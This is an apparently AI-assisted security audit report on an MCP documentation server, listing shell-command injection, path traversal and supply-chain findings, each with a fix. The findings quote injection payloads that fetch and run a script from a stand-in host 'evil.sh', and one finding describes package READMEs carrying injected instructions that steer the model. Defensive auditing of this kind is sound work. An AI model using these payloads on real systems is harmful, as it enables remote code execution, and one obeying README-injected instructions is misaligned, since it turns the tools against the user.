# Agent & MCP security report

Scanned: `/tmp/blind/c21` · 2026-11-23T20:57:22+00:00 · auditor v1.0.0 · mode: reviewed

## Verdict: 🔴 Fix before shipping

| Critical | High | Medium | Low | Info | Dismissed as false alarm | Needs context |
|---|---|---|---|---|---|---|
| 3 | 1 | 1 | 2 | 0 | 0 | 0 |

## What was checked

- MCP servers in config files: **0** · tools found in code: **13** · agent/MCP code files: **3** · agent instruction files: **0**
- Frameworks seen: mcp, modelcontextprotocol

## Findings

### M001 · CRITICAL · describe_go_package / lookup_go_doc: package and symbol pasted into shell commands
`None:None` · ASI05 Unexpected Code Execution

isGoDocArgs only checks that package/symbol are strings; package='fmt; curl evil.sh | sh' runs through exec() (a shell) on the first call (go list), and symbol is injected the same way into go doc.
> `src/package-docs-server.ts:1576` — `const { package: packageName, symbol, projectPath } = args`
> `src/package-docs-server.ts:339` — `const { stdout } = await execAsync(`go list -f '{{.Dir}}' ${packageName}`)`
> `src/package-docs-server.ts:1594` — `? `go doc ${packageName}.${symbol}``

**Fix:** Use execFile('go', ['list', '-f', '{{.Dir}}', '--', pkg]) / execFile('go', ['doc', `${pkg}.${symbol}`]) and validate package against ^[A-Za-z0-9._~/-]+$ and symbol against ^[A-Za-z0-9_.]+$.

### M002 · CRITICAL · describe_python_package / lookup_python_doc: package and symbol inside python3 -c "..." shell string
`None:None` · ASI05 Unexpected Code Execution

package is placed inside a double-quoted shell argument and inside Python source: package='x$(curl evil.sh|sh)' runs via the shell, and package="os')\nimport os;os.system('id')#" runs as Python. Both are reached by the first call (find_spec check), and symbol is injected again into help(...).
> `src/package-docs-server.ts:1829` — `const { package: packageName, symbol } = args`
> `src/package-docs-server.ts:356` — `spec = importlib.util.find_spec('${packageName}')`
> `src/package-docs-server.ts:359` — `const { stdout } = await execAsync(`python3 -c "${pythonCode}"`)`

**Fix:** Do not build code from arguments: execFile('python3', ['-c', FIXED_SCRIPT, pkg, symbol]) where the script reads sys.argv, and validate pkg with ^[A-Za-z0-9_.-]+$.

### M003 · CRITICAL · search_package_docs (language go/python) reaches the same shell commands
`None:None` · ASI05 Unexpected Code Execution

search_package_docs passes its free package string into the same exec() helpers (go list / go doc / python3 -c), so it is a second entry point to M001/M002.
> `src/package-docs-server.ts:676` — `const { package: packageName, query, language, fuzzy = true, projectPath } = args`
> `src/package-docs-server.ts:747` — `isInstalled = await this.isGoPackageInstalledLocally(packageName, projectPath)`
> `src/package-docs-server.ts:763` — `const { stdout } = await execAsync(`go doc ${packageName}`)`

**Fix:** Same as M001/M002 (fix the helpers once).

### M004 · HIGH · describe_swift_package: symbol and package name pasted into swift doc shell command
`None:None` · ASI05 Unexpected Code Execution

When the package is listed in a Package.swift under the (attacker-chosen) projectPath - true for any real dependency of the user's project - symbol='x; curl evil.sh | sh' runs through exec(). Rated high because of that precondition.
> `src/package-docs-server.ts:1959` — `const { package: packageUrl, symbol, projectPath } = args`
> `src/package-docs-server.ts:1964` — `const isInstalled = await this.isSwiftPackageInstalledLocally(packageUrl, projectPath)`
> `src/package-docs-server.ts:581` — `? `swift doc generate ${packageName} --module-name ${packageName} --symbol ${symbol}``

**Fix:** execFile('swift', ['doc', 'generate', name, '--module-name', name, '--symbol', symbol]) with symbol/name validated against ^[A-Za-z0-9_.-]+$.

### M006 · MEDIUM · Third-party READMEs and docs returned raw to the model
`None:None` · 

README/doc text written by any package author (npm, PyPI, GitHub) is returned unmarked into the model context; injected instructions there can steer the model into calling the command-injectable tools above.
> `src/package-docs-server.ts:1991` — `const readmeUrl = `https://raw.githubusercontent.com/${repoPath}/main/README.md``
> `src/package-docs-server.ts:2009` — `usage = section.split("\n").slice(1).join("\n").trim()`

**Fix:** Mark returned docs as untrusted data and fix M001-M004 so a steered call cannot run commands.

### M005 · LOW · npm tools read package.json/README from any path via package or projectPath
`None:None` · ASI02 Tool Misuse and Exploitation

package='../../../some/dir' or any projectPath makes the server read package.json and README files anywhere and return their description/usage/example sections. Only files with those names are read, so low.
> `src/npm-docs-integration.ts:94` — `const { package: packageName, version, projectPath, includeTypes = true, includeExamples = true } = args;`
> `src/package-docs-server.ts:517` — `const packagePath = join(basePath, "node_modules", packageName)`
> `src/package-docs-server.ts:536` — `const readme = readFileSync(readmePath, "utf-8")`

**Fix:** Validate package against the npm name pattern (^(@[a-z0-9-~][a-z0-9-._~]*/)?[a-z0-9-~][a-z0-9-._~]*$) and resolve the final path inside projectPath/node_modules.

### M007 · LOW · LSP mode installs unpinned npm packages at runtime
`None:None` · ASI04 Agentic Supply Chain

With ENABLE_LSP=true and the server missing, the server runs npm install of unpinned latest packages (with install scripts) at runtime; package names are constants, so this is supply-chain hardening only.
> `src/lsp/typescript-lsp-client.ts:50` — `await exec(`npm install --no-save ${packageName}`);`
> `src/lsp/typescript-lsp-client.ts:143` — `'typescript-language-server': 'typescript-language-server typescript',`

**Fix:** Pin versions (and --ignore-scripts) or require the language servers to be preinstalled.

## Limits

- Static review: the auditor reads code and configs; it does not run servers or attack them. Logic bugs, auth flaws in other services and runtime behaviour can be missed.
- Tool descriptions are checked as written in the code or a tools/list export; a remote server can return different text at runtime (use `pin --check` on exported tools.json).
- AI-assisted: findings are judged by an AI agent with every quote verified against the code; a human should confirm critical fixes.
